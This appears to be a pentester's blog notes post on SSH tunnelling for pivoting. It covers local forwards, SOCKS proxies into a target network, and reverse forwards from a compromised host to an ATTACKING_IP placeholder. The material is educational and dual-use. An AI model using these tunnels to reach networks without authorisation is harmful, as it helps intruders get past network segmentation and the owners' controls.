---
title: SSH Tunnelling / Port Forwarding - Notes
date: 2022-07-01 00:00:00 +530
categories: [ Cyber Security Notes, Pivoting]
tags: [Notes, Pentesting, Pivoting, SSH, Tunnelling, Port Forward, Red Team]     # TAG names should always be lowercase
---

------------------

**Forward Connections**

Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.

There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.

-   Port forwarding is accomplished with the `-L` switch, which creates a link to a **L**ocal port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:  `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`  
    We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 _on our own_ _attacking machine._ For example, by entering `localhost:8000` into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box. Note that it's good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use `sudo` to create the connection. The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.

-   Proxies are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:  `ssh -D 1337 user@172.16.0.5 -fN`  
    This again uses the `-fN` switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.

**Reverse Connections**  

Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine _from_ the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:


1. First, generate a new set of SSH keys and store them somewhere safe (`ssh-keygen`):
This will create two new files: a private key, and a public key.  

2.  Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file first.

3.  On a new line, type the following line, then paste in the public key:  
    `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`  
    This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.

Next. check if the SSH server on your attacking machine is running:  
`sudo systemctl status ssh`

If the status command indicates that the server is not running then you can start the ssh service with:  
`sudo systemctl start ssh`

With the key transferred, we can then connect back with a reverse port forward using the following command:  
`ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN`

In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:  
`ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`


To close any of these connections, type `ps aux | grep ssh` into the terminal of the machine that created the connection:
Finally, type `sudo kill PID` to close the connection: